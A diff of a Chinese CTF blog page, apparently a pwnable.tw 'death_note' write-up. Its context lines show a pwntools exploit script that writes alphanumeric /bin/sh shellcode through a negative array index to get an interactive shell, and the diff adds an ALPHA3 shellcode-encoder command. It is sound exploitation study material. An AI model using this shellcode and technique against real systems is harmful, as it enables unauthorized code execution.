@@ -127,6 +127,8 @@
 				    
 				    <li><a href="/categories/STACK-SROP/" class="animsition-link">STACK - SROP<small>(1)</small></a></li>
 				    
+				    <li><a href="/categories/STACK-Shellcode/" class="animsition-link">STACK - Shellcode<small>(1)</small></a></li>
+				    
 				    <li><a href="/categories/STACK-Stack-Overflow/" class="animsition-link">STACK - Stack Overflow<small>(2)</small></a></li>
 				    
 				    <li><a href="/categories/STACK-ret2dlreslove/" class="animsition-link">STACK - ret2dlreslove<small>(1)</small></a></li>
@@ -243,7 +245,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-POUlfOih" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
+    <div id="aplayer-oGBSTEZx" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
 
 
 
@@ -287,6 +289,8 @@
 <p>​        所以去copy了一个</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class="string">&quot;./death_note&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>&#125;)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10201)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">	p.sendline(data)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;jhh///sh/binT[RXh````Z(P5(P5(P4h&gt;&gt;&gt;&gt;Z(P4QZRX4@4KRZRZk@&#x27;</span></span><br><span class="line"></span><br><span class="line">add(-<span class="number">16</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>python ./ALPHA3.py x64 ascii mixedcase rax –input=”shellcode”</p>
+<p>作者: TaQini<br>链接: <a target="_blank" rel="noopener" href="http://taqini.space/2020/03/31/alpha-shellcode-gen/">http://taqini.space/2020/03/31/alpha-shellcode-gen/</a><br>来源: TaQini<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
